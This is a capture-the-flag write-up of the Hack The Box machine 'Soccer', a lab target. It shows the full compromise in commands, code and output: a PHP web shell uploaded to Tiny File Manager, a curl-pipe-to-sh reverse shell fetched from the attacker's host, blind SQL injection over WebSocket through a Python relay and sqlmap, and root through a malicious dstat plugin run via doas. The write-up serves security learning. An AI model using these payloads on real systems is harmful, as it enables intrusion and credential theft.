---
title: Hack The Box - Soccer
tags: [HTB, Webapp Exploit, WebSocket Exploit, nmap, Python, Privilege Escalation]
layout: post
---

Some Description

## Summary
- Information Gathering
    - Nmap Scanning
    - Enum Subfolder
- Exploit CVE for Vulnerable Version
    - Exploit Website get Shell
    - Figure out another Website
- Privilege Escalation
    - Enum 
    - Exploit

---

## Information Gathering Stage

### Nmap Scanning

`map -sV -sC -Pn -v -oN nmap-report_soccer -p- 10.10.11.194`

```sh
PORT     STATE SERVICE         VERSION
22/tcp   open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http            nginx 1.18.0 (Ubuntu)
9091/tcp open  xmltec-xmlmail?

```

---

### Enum Subfolder

```sh
┌──(kali㉿kali)-[~/gobuster]
└─$ sudo ./gobuster dir --url http://soccer.htb/ --wordlist /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://soccer.htb/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
2023/04/24 22:56:21 Starting gobuster in directory enumeration mode
===============================================================
/tiny                 (Status: 301) [Size: 178] [--> http://soccer.htb/tiny/]
Progress: 220534 / 220561 (99.99%)
===============================================================
2023/04/24 23:12:20 Finished
===============================================================
```

---

## Exploit CVE for Vulnerable Version

---

### Exploit Website get Shell

---

#### UnRestricted File Upload 

```sh
POST /tiny/tinyfilemanager.php?p=tiny/uploads HTTP/1.1
Host: soccer.htb
Accept: application/json
X-Requested-With: XMLHttpRequest
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryb2kFsZoCHAQcAN7v
...
Connection: close

------WebKitFormBoundaryb2kFsZoCHAQcAN7v
Content-Disposition: form-data; name="p"

tiny/uploads
------WebKitFormBoundaryb2kFsZoCHAQcAN7v
Content-Disposition: form-data; name="fullpath"

pwn_the7ir.php
------WebKitFormBoundaryb2kFsZoCHAQcAN7v
Content-Disposition: form-data; name="file"; filename="pwn_123.php"
Content-Type: text/plain

<?php system($_REQUEST['cmd']); ?>
------WebKitFormBoundaryb2kFsZoCHAQcAN7v--
```

---

#### Call RCE

```sh
GET /tiny/uploads/pwn_the7ir.php?cmd=curl+userad+10.10.14.55%3a1337/reshell_python.sh|sh HTTP/1.1
Host: soccer.htb
...
```

Get shell www-data , but not read user.txt
Find a way

---

#### Figure out another Website

Cat /etc/nginx/nginx.conf

```sh
include /etc/nginx/modules-enabled/*.conf;
http {
        ...
        include /etc/nginx/mime.types;
        default_type application/octet-stream;
        ...

        access_log /var/log/nginx/access.log;
        error_log /var/log/nginx/error.log;

        include /etc/nginx/conf.d/*.conf;
        include /etc/nginx/sites-enabled/*;
}

```

View Ports listening

```sh
www-data@soccer:/etc/nginx$ netstat -tulpn

Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      1113/nginx: worker  
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:9091            0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      1113/nginx: worker  
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
udp        0      0 0.0.0.0:68              0.0.0.0:*                           -                   

```

Detect 80,22,300,9091,33060,3306,68,...

Cat File in Config Folder

```sh
www-data@soccer:/etc/nginx/sites-enabled$ ls
default  soc-player.htb
www-data@soccer:/etc/nginx/sites-enabled$ cat soc-player.htb
cat soc-player.htb
server {
        listen 80;
        listen [::]:80;

        server_name soc-player.soccer.htb;

        root /root/app/views;

        location / {
                proxy_pass http://localhost:3000;
                proxy_http_version 1.1;
                proxy_set_header Upgrade $http_upgrade;
                proxy_set_header Connection 'upgrade';
                proxy_set_header Host $host;
                proxy_cache_bypass $http_upgrade;
        }

}
```

---

### Figure out another Website

`echo 10.10.11.194    soc-player.soccer.htb | sudo tee -a /etc/hosts`

Testing around the second website

Detect Subfolder for the second Website

```sh
$sudo ./gobuster dir --url http://soc-player.soccer.htb/ --wordlist /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[sudo] password for kali: 
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://soc-player.soccer.htb/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
2023/04/25 01:55:24 Starting gobuster in directory enumeration mode
===============================================================
/img                  (Status: 301) [Size: 173] [--> /img/]
/login                (Status: 200) [Size: 3307]
/signup               (Status: 200) [Size: 3741]
/css                  (Status: 301) [Size: 173] [--> /css/]
/Login                (Status: 200) [Size: 3307]
/js                   (Status: 301) [Size: 171] [--> /js/]
/logout               (Status: 302) [Size: 23] [--> /]
/check                (Status: 200) [Size: 31]
/match                (Status: 200) [Size: 10078]
/Signup               (Status: 200) [Size: 3741]
/SignUp               (Status: 200) [Size: 3741]
/Logout               (Status: 302) [Size: 23] [--> /]
/signUp               (Status: 200) [Size: 3741]
/Match                (Status: 200) [Size: 10078]
/LogIn                (Status: 200) [Size: 3307]
Progress: 116590 / 220561 (52.86%)[1]  + killed     leafpad note_soccer.txt
/LOGIN                (Status: 200) [Size: 3307]
Progress: 220534 / 220561 (99.99%)
===============================================================
2023/04/25 02:11:17 Finished
===============================================================
```

Perform Signup and Login 
Web display 1 function search for ticket -> using Web socket

Exploit Web socket

```sh
Server: http://soc-player.soccer.htb:9091/
{"id":"53801 or substring(version(),1,1)=8"}
```
-> this is Blind SQL injection

Using File python [Automating Blind SQL Injection](https://rayhan0x01.github.io/ctf/2021/04/02/blind-sqli-over-websocket-automation.html) before i use sqlmap to auto leak data.

```python
from http.server import SimpleHTTPRequestHandler
from socketserver import TCPServer
from urllib.parse import unquote, urlparse
from websocket import create_connection

ws_server = "ws://soc-player.soccer.htb:9091/"

def send_ws(payload):
	ws = create_connection(ws_server)
	# If the server returns a response on connect, use below line	
	#resp = ws.recv() # If server returns something like a token on connect you can find and extract from here
	
	# For our case, format the payload in JSON
	message = unquote(payload).replace('"','\'') # replacing " with ' to avoid breaking JSON structure
	data = '{"id":"%s"}' % message

	ws.send(data)
	resp = ws.recv()
	ws.close()

	if resp:
		return resp
	else:
		return ''

def middleware_server(host_port,content_type="text/plain"):

	class CustomHandler(SimpleHTTPRequestHandler):
		def do_GET(self) -> None:
			self.send_response(200)
			try:
				payload = urlparse(self.path).query.split('=',1)[1]
			except IndexError:
				payload = False
				
			if payload:
				content = send_ws(payload)
			else:
				content = 'No parameters specified!'

			self.send_header("Content-type", content_type)
			self.end_headers()
			self.wfile.write(content.encode())
			return

	class _TCPServer(TCPServer):
		allow_reuse_address = True

	httpd = _TCPServer(host_port, CustomHandler)
	httpd.serve_forever()


print("[+] Starting MiddleWare Server")
print("[+] Send payloads in http://localhost:8081/?id=*")

try:
	middleware_server(('0.0.0.0',8081))
except KeyboardInterrupt:
	pass

```

Run file python

```sh
python3 ./websoc.py
[+] Starting MiddleWare Server
[+] Send payloads in http://localhost:8081/?id=*
127.0.0.1 - - [25/Apr/2023 04:25:21] "GET /?id= HTTP/1.1" 200 -

```
Exploit SQL injection

```sh
sqlmap -u "http://localhost:8081/?id=1" --dbs
sqlmap -u "http://localhost:8081/?id=1" -D soccer_db --tables
sqlmap -u "http://localhost:8081/?id=1" -D soccer_db -T accounts --dump 

Database: soccer_db
Table: accounts
[1 entry]
+------+-------------------+----------------------+----------+
| id   | email             | password             | username |
+------+-------------------+----------------------+----------+
| 1324 | player@player.htb | Play***************2 | player   |
+------+-------------------+----------------------+----------+

```

Login with Player and cat file user.txt

user: `********************************`

---

## Privilege Escalation

---

### Enumeration

```sh
www-data@soccer:/etc/nginx/sites-enabled$ echo $PATH

/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

$ ls /usr/local/bin

doas  doasedit  vidoas

```
[What is doas???](https://www.maketecheasier.com/what-is-install-doas/#:~:text=Doas%20is%20a%20privilege%20escalation,systems%20through%20the%20OpenDoas%20program.)

```sh
$ cat /usr/local/etc/doas.conf
cat /usr/local/etc/doas.conf
permit nopass player as root cmd /usr/bin/dstat
```

---

### Exploitation

[How to exploit dstat to Privilege Escalation](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-dstat-privilege-escalation/)

Doas permit nopass player as root do command at /sr/bin/dstat

We are prepare file dstat_exploit.py as plugin in dstat. Dstat_exploit.py is reshell python.

List and backconnect to get root Shell.

```sh
$ pwd
/usr/local/share/dstat

$ wget 10.10.14.55:1338/dstat_exploit.py
wget 10.10.14.55:1338/dstat_exploit.py --2023-04-26 01:43:27--  http://10.10.14.55:1338/dstat_exploit.py
Connecting to 10.10.14.55:1338... connected.
HTTP request sent, awaiting response... 200 OK
Saving to: â€˜dstat_exploit.pyâ€™

dstat_exploit.py    100%[===================>] 200 OK

$ dstat --list | grep exploit
dstat --list | grep exploit
        exploit     

```

Prepare is done, run listen `nc -nlvp 9001 ` and run command as root from player user.

```sh
$/usr/local/bin/doas -u root /usr/bin/dstat --exploit
```

Rooted

```sh
nc -nlvp 9001
listening on [any] 9001 ...
connect to [10.10.14.55] from (UNKNOWN) [10.10.11.194] 33450
# whoami
root
# ls
# pwd
/usr/local/share/dstat
# cd /root
# ls
app  root.txt  run.sql  snap
# cat root.txt
cat root.txt
c1****************************0d

```


